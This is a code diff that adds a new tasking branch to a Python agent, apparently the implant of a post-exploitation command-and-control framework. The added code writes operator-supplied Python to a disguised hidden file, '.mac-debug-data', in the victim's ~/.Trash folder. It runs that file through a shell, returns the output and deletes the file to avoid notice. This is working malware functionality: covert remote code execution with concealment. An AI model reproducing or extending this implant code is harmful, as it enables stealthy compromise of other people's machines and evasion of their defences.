@@ -1,4 +1,5 @@
 import struct, time, base64, subprocess, random, time, datetime
+from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
 import os
@@ -326,6 +327,35 @@ def processPacket(taskingID, data):
             # Also return partial code that has been executed 
             errorData = str(buffer.getvalue())
             return encodePacket(0, "error executing specified Python data")
+
+    elif taskingID == 102:
+        # on disk code execution for modules that require multiprocessing not supported by exec
+        try:
+            implantHome = expanduser("~") + '/.Trash/'
+            moduleName = ".mac-debug-data"
+            implantPath = implantHome + moduleName
+            result = "[*] Module disk path: %s \n" %(implantPath) 
+            with open(implantPath, 'w') as f:
+                f.write(data)
+            result += "[*] Module properly dropped to disk \n"
+            pythonCommand = "python %s" %(implantPath)
+            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
+            data = process.communicate()
+            result += data[0].strip()
+            try:
+                os.remove(implantPath)
+                result += "\n[*] Module path was properly removed: %s" %(implantPath) 
+            except Exception as e:
+                print "error removing module filed: %s" %(e)
+            fileCheck = os.path.isfile(implantPath)
+            if fileCheck:
+                result += "\n\nError removing module file, please verify path: " + str(implantPath)
+            return encodePacket(100, str(result))
+        except Exception as e:
+            fileCheck = os.path.isfile(implantPath)
+            if fileCheck:
+                return encodePacket(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath))
+            return encodePacket(0, "error executing specified Python data: %s" %(e))
 
     elif taskingID == 110:
         start_job(data)
